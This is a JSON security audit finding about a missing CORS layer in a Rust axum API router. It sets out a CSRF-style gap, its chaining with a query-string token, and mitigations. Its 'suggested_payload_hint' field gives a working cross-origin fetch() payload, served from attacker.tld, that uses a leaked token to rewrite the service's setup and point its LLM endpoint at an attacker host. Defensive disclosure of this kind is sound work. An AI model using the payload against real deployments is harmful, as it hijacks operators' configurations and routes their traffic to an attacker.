{
  "path": "crates/nyctos-api/src/router.rs",
  "line": 48,
  "cap": "CORS_MISCONFIG",
  "endpoint": "all /api/v1/* (no CorsLayer attached)",
  "rationale": "build_router stacks only TraceLayer and the bearer auth_layer (router.rs:89-91). No tower_http::cors::CorsLayer anywhere in the crate (grep `Cors` returns zero matches across nyctos-api). Browser SOP still blocks cross-origin JSON `fetch()` reads, but two real gaps remain: (1) simple-request writes — `POST` with `Content-Type: text/plain` (or `application/x-www-form-urlencoded`) skip the preflight entirely; axum's Json extractor reads the body regardless of Content-Type so a CSRF-style cross-origin POST to /api/v1/setup or /api/v1/projects lands; (2) chains with the `?token=` URL-query auth (router.rs:142) and the constant_eq length oracle (existing finding) — once a bearer leaks via any channel, a malicious page can use it cross-origin to mutate state because there is no Origin / SameSite gate. Mitigation: attach a deny-by-default CorsLayer with allow_origin pinned to the operator's UI origin, require `Content-Type: application/json` at the extractor, and refuse `?token=` for any non-GET method (or drop the query-token path entirely). Static pass missed because the bug is structural (a missing layer) not a tainted-flow sink.",
  "suggested_payload_hint": "host attacker.tld with: fetch('http://127.0.0.1:8088/api/v1/setup?token='+leaked,{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:'{\\\"ai_runtime\\\":\\\"local-llm\\\",\\\"local_llm_url\\\":\\\"http://attacker/api\\\",\\\"sandbox_backend\\\":\\\"process\\\",\\\"i_own_this\\\":true}'}); — operator visits the page, hostile nyctos.toml lands."
}

